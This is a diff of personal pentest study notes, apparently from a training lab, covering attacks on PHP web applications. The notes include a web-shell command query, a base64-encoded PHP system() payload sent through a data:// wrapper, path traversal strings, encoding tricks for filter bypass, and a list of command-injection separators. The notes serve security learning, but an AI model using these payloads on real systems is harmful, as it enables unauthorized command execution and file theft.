@@ -12,7 +12,7 @@ PHP Payload
 simple-backdoor.php?cmd=cat%20/opt/install.txt
 # above file uploaded function over http call
 
-PHPWrappers
+============= PHPWrappers =============
 # When the <body> is not closed, can indicate content not being displayed, so we can use Wraper to get them
 
 # php://filter
@@ -31,7 +31,8 @@ echo -n '<?php echo system($_GET["cmd"]);?>' | base64
 curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,666666239asjdkfqaw34==&cmd=whoami"
 # Will try to bypass filter using encoding, needs the cmd parameter with the command
 
-Path traversal
+
+============= Path traversal =============
 /../../../../../../../../users/install.txt
 curl --path-as-is
 # help to not get trouble
@@ -61,8 +62,24 @@ Easy: case sensitive
 URL Encondes:
 %20: " "
 %2e: "."
+%3B: ";"
+
 # filters with php can be also bypassed with less common extensios as php7 or phps
 
 ======= COMMAND INJECTION ==========
 instead of using | to next cmd, try ;
 git --version; cat flag.txt
+# Chars with possible command injection
+&
+;
+Newline (0x0a or \n)
+&&
+|
+||
+`command `
+`command
+$(command )
+
+
+============= File Upload =============
+# TIP: when return says that the file already exists, we can enumerate; when not, we can see error messages.
